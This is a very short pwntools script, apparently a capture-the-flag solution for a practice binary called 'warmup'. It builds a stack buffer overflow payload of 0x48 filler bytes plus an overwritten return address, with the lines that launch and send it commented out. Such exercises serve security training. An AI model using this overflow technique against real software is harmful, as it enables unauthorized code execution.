from pwn import *

# target = process('./warmup')
# gdb.attach(target, gdbscript = 'b *0x40069e')

payload = ""
payload = "0" * 0x48
payload += p64(0x0040060d).decode()

print(payload)

# target.sendline(payload)

# target.interactive()
